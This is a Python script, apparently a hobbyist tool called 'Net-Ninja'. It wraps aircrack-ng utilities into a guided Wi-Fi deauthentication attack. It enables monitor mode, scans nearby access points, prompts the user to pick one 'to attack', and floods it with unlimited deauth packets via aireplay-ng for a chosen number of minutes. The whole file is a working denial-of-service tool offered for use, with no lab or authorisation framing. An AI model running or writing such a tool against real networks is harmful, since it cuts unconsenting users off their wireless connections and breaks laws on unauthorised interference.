#!/usr/bin/env python3
import os
import subprocess
import re
import time
import signal
import sys
import glob
import shutil

print(
    r"""
ooooo      ooo               .           ooooo      ooo  o8o                  o8o           
`888b.     `8'             .o8           `888b.     `8'  `"'                  `"'           
 8 `88b.    8   .ooooo.  .o888oo          8 `88b.    8  oooo  ooo. .oo.      oooo  .oooo.   
 8   `88b.  8  d88' `88b   888            8   `88b.  8  `888  `888P"Y88b     `888 `P  )88b  
 8     `88b.8  888ooo888   888   8888888  8     `88b.8   888   888   888      888  .oP"888  
 8       `888  888    .o   888 .          8       `888   888   888   888      888 d8(  888  
o8o        `8  `Y8bod8P'   "888"         o8o        `8  o888o o888o o888o     888 `Y888""8o 
                                                                              888           
                                                                          .o. 88P           
                                                                          `Y888P            
    
                                                                                   By: Mohit Pimoli
                                                                                   Version: 1.1
                                                                                                                                                                                                                                                                                                                 
"""
)

# Global variables
monitor_process = None
interface = None
ap_list_file = "ap_list.csv"


def check_sudo():
    """Check if the script is run with sudo."""
    if not "SUDO_UID" in os.environ:
        print("\033[31mThis script must be run with sudo.\033[0m")
        sys.exit(1)


def check_tools():
    """Check if airmon-ng, airodump-ng, and aireplay-ng are installed."""
    required_tools = ["airmon-ng", "airodump-ng", "aireplay-ng"]
    missing_tools = []

    for tool in required_tools:
        if not shutil.which(tool):
            missing_tools.append(tool)

    if missing_tools:
        print("\nThe following required tools are missing:")
        for tool in missing_tools:
            print(f"- {tool}")
        print("\nPlease install them using the following command:")
        print("sudo apt update && sudo apt install aircrack-ng -y")
        sys.exit(1)


def list_wlan_interfaces():
    """List available WLAN interfaces."""
    wlan_pattern = re.compile("^wlan[0-9]+")
    iwconfig_output = subprocess.run(["iwconfig"], capture_output=True).stdout.decode()
    wlan_interfaces = wlan_pattern.findall(iwconfig_output)

    if not wlan_interfaces:
        print(
            "\033[31mNo wireless interfaces found. Please connect a wireless adapter.\033[0m"
        )
        sys.exit(1)

    print("Available wireless interfaces:\n")
    for idx, wlan in enumerate(wlan_interfaces):
        print(f"\033[33m{idx}: {wlan}\033[0m")

    return wlan_interfaces


def select_interface(wlan_interfaces):
    """Allow the user to select a WLAN interface."""
    while True:
        try:
            choice = input("\nSelect the interface you want to use: ").strip()
            if choice.isdigit():
                num = int(choice)
                if 0 <= num < len(wlan_interfaces):
                    return wlan_interfaces[num]
                else:
                    print("\033[31mInvalid selection. Try again.\033[0m")
            else:
                print("\033[31mPlease enter a valid number.\033[0m")
        except ValueError:
            print("Please enter a valid number.")


def enable_monitor_mode(interface):
    """Enable monitor mode on the selected interface."""
    try:
        print("\033[34m\nEnabling monitor mode.This can take few seconds....\n\033[0m")
        subprocess.run(["sudo", "ip", "link", "set", interface, "down"], check=True)
        time.sleep(1)
        subprocess.run(["sudo", "iw", interface, "set", "type", "monitor"], check=True)
        time.sleep(1)
        subprocess.run(["sudo", "ip", "link", "set", interface, "up"], check=True)
        print(f"\033[32mMonitor mode enabled on {interface}.\033[0m")
        time.sleep(4)
    except subprocess.CalledProcessError:
        print(f"\033[31mFailed to enable monitor mode on {interface}.\033[0m")
        sys.exit(1)


def disable_monitor_mode(interface):
    """Disable monitor mode and return the interface to managed mode."""
    try:
        print("\033[34mDisabling monitor mode.This can take few seconds....\n\033[0m")
        subprocess.run(["sudo", "ip", "link", "set", interface, "down"], check=True)
        time.sleep(1)
        subprocess.run(["sudo", "iw", interface, "set", "type", "managed"], check=True)
        time.sleep(1)
        subprocess.run(["sudo", "ip", "link", "set", interface, "up"], check=True)
        time.sleep(4)
        print(f"\033[32mManaged mode restored on {interface}.\033[0m")
    except subprocess.CalledProcessError:
        print(f"\033[31mFailed to disable monitor mode on {interface}.\033[0m")


def start_scanning(interface):
    """Start scanning for access points."""
    global monitor_process

    # Remove existing CSV files with the same base name
    for file in os.listdir():
        if file.startswith("ap_list") and file.endswith(".csv"):
            os.remove(file)
    print("\033[34m\nScanning for access points. Be patient...\n\033[0m")
    time.sleep(5)

    # Run airodump-ng and write output to a specific CSV file
    monitor_process = subprocess.Popen(
        ["sudo", "airodump-ng", "-w", "ap_list", "--output-format", "csv", interface],
        stdout=subprocess.DEVNULL,
        stderr=subprocess.DEVNULL,
    )
    time.sleep(30)


def stop_scanning():
    """Stop the scanning process."""
    global monitor_process
    if monitor_process:
        monitor_process.terminate()
        monitor_process.wait()


def parse_ap_list():
    """Parse the AP list from the most recent CSV file."""

    # Find the latest AP list file matching the prefix
    ap_files = sorted(glob.glob("ap_list-*.csv"), key=os.path.getmtime, reverse=True)
    if not ap_files:
        print("AP list file not found. Ensure scan is running.")
        return []

    aps = []
    try:
        with open(ap_files[0], "r") as f:
            lines = f.readlines()
            for line in lines:
                if "Station MAC" in line:
                    break
                parts = line.split(",")
                if len(parts) >= 14 and "BSSID" not in parts[0]:
                    aps.append(
                        {
                            "BSSID": parts[0].strip(),
                            "PWR": parts[8].strip(),
                            "CH": parts[3].strip(),
                            "ENC": parts[5].strip(),
                            "ESSID": parts[13].strip(),
                        }
                    )
    except FileNotFoundError:
        print("\033[31mError reading the AP list file.\033[0m")
    return aps


def display_ap_list(aps):
    """Display the APs in a clean numbered list."""
    print("\nAvailable Access Points:")
    print(f"{'No.':<5} {'BSSID':<20} {'PWR':<5} {'CH':<5} {'ENC':<8} {'ESSID':<20}")
    print("-" * 60)
    for idx, ap in enumerate(aps):
        print(
            f"{idx:<5} {ap['BSSID']:<20} {ap['PWR']:<5} {ap['CH']:<5} {ap['ENC']:<8} {ap['ESSID']:<20}"
        )
    time.sleep(3)


def select_ap(aps):
    """Allow the user to select an AP from the list."""
    while True:
        try:
            print(f"Available APs count: {len(aps)}")  # Debugging line
            choice = input("\nSelect the AP to attack (by number): ").strip()
            print(f"\nUser selected: {choice}")  # Debugging line
            if choice.isdigit():
                choice = int(choice)
                if 0 <= choice < len(aps):
                    print(f"AP {aps[choice]['ESSID']} selected.")  # Debugging line
                    return aps[choice]
                else:
                    print("\033[31mInvalid selection. Try again.\033[0m")
            else:
                print("\033[31mPlease enter a valid number.\033[0m")
        except EOFError:
            print(
                "\033[31m\nEOFError: Input stream ended unexpectedly. Please try again.\033[0m"
            )
        except ValueError:
            print("\033[31mPlease enter a valid number.\033[0m")


def start_deauth_attack(selected_ap, interface):
    """Start a deauthentication attack on the selected AP."""
    try:
        time.sleep(3)
        duration = input(
            "\nEnter the duration of the attack in minutes (e.g., 1, 2, 3, ...): "
        ).strip()
        print(f"\nUser provided: {duration}")
        if duration.isdigit():
            num = int(duration)
            if num <= 0:
                print("\033[31mDuration must be greater than 0.\033[0m")
                return
        else:
            print("\033[31mPlease enter a valid number.\033[0m")

        print(
            f"\033[34m\nStarting deauth attack on {selected_ap['ESSID']} ({selected_ap['BSSID']}) for {num} minute(s).\033[0m"
        )
        # Calculate duration in seconds
        duration_seconds = num * 60
        start_time = time.time()

        # Command to execute aireplay-ng
        deauth_command = [
            "sudo",
            "aireplay-ng",
            "--deauth",
            "0",  # Infinite deauth packets
            "-a",
            selected_ap["BSSID"],  # Target AP's BSSID
            interface,
        ]

        # Run aireplay-ng in a subprocess
        deauth_process = subprocess.Popen(
            deauth_command, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
        )

        # Monitor the time
        while time.time() - start_time < duration_seconds:
            time.sleep(1)

        # Stop the attack
        print("\033[34m\nStopping the deauth attack...\033[0m")
        deauth_process.terminate()
        deauth_process.wait()
        print("Deauth attack stopped.")

    except ValueError:
        print(
            "\033[31mInvalid input. Please enter a valid number for the duration.\033[0m"
        )
    except Exception as e:
        print(f"\033[31mAn error occurred: {e}\033[0m")


def signal_handler(sig, frame):
    """Handle termination signals."""
    print("\nCleaning up and exiting...")
    stop_scanning()
    disable_monitor_mode(interface)
    sys.exit(0)


# Register signal handlers
signal.signal(signal.SIGINT, signal_handler)
signal.signal(signal.SIGTERM, signal_handler)


if __name__ == "__main__":
    # Step 1: Check for sudo
    check_sudo()

    # Step 2: Check for required tools
    check_tools()

    try:
        # Step 3: List WLAN interfaces and select one
        wlan_interfaces = list_wlan_interfaces()
        interface = select_interface(wlan_interfaces)

        # Step 4: Enable monitor mode
        enable_monitor_mode(interface)

        # Step 5: Start scanning for APs
        start_scanning(interface)

        # Step 6: Parse and display APs
        aps = parse_ap_list()
        display_ap_list(aps)

        # Step 7: Select an AP to attack
        selected_ap = select_ap(aps)
        print(f"\nSelected AP: {selected_ap['ESSID']} ({selected_ap['BSSID']})")

        # Step 8: Start the deauthentication attack
        start_deauth_attack(selected_ap, interface)

    finally:
        # Cleanup
        stop_scanning()
        disable_monitor_mode(interface)
